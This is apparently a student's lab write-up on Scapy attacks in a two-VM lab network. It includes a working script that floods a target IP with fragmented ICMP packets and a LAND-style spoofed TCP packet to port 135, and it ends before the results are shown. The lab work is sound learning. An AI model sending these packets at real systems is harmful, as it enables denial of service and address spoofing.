##Lab 6 - Scapy Attacks on ARP

As in the previous lab, I have two Ubuntu VM's on an internal network with m0n0wall assigning IPs via DHCP.

Artist's rendering:

                  Attacker                  Target
             _______________          |*\_/*|________
            |  ___________  |        ||_/-\_|______  |
            | |           | |        | |           | |
            | |   0   0   | |        | |   0   0   | |
            | |     -     | |        | |     -     | |
            | |   \___/   | |        | |   \___/   | |
            | |___     ___| |        | |___________| |
            |_____|\_/|_____|        |_______________|
            _|__|/ \|_|_.............._|________|_
             / ********** \      |    / ********** \
            /  ************  \   |   /  ************  \
            -------------------- |  --------------------
                                 |
                                 |
                                 |
                   __/ ///////// /|
                  /              ¯/|
                 /_______________/ |
                |  __________  |  |
                | |          | |  |
                | | m0n0wall | |  |
                | |          | |  |
                | |__________| | /   
                |______________|/ ___/\
                |____>______<_____/     \
              / = ==== ==== ==== /|    _|_
            / ========= === ===/ /   ////
           / ========= === ===/ /   /  / 
          <__________________<_/    ¯¯¯


Q1 (A): fragment(IP(dst=target)/ICMP()/("DEADBEEF"*25000))

This command will send the payload of "DEADBEEF" 25000 times to the target machine.  By adding in a fragsize, it will fragment into byte segments of 500.

I found an elegant way to do this here [1]:

Note: <code> from scapy.all import *</code> is necessary as <code>from scapy import *</code> doesn't import the modules for my machine

      from scapy.all import *
      import netifaces as nt
      import sys
      
      target="192.168.1.104"
      packet = fragment(IP(dst=target)/ICMP()/("DEADBEEF" * 25000))
      frags=fragment(packet,fragsize=500)
      counter=1
      for fragment in frags:
            print "Packet number"+str(counter)
            print "======================================================="
            fragment.show() #displays each fragment
            counter+=1
            send(fragment)

![Scapy - Nice display!](/images/Lab6-DEADBEEF.png)

The attacking machine sent 406 packets with the payload "DEADBEEF" and it set the MF (More Fragment) bit flag.

Q1 (B):  IP(src=target,dst=target)/TCP(sport=135,dport=135)
From the attacker side, spoofing the source of the packet:

![Spoofed source](/images/Lab6-spoofed_src_and_des.png)

There's no explicit payload so I'm curious to see what it looks like on the target machine's end.

That's next!












[1]: http://rtoodtoo.net/fragmented-ip-packet-forwarding/
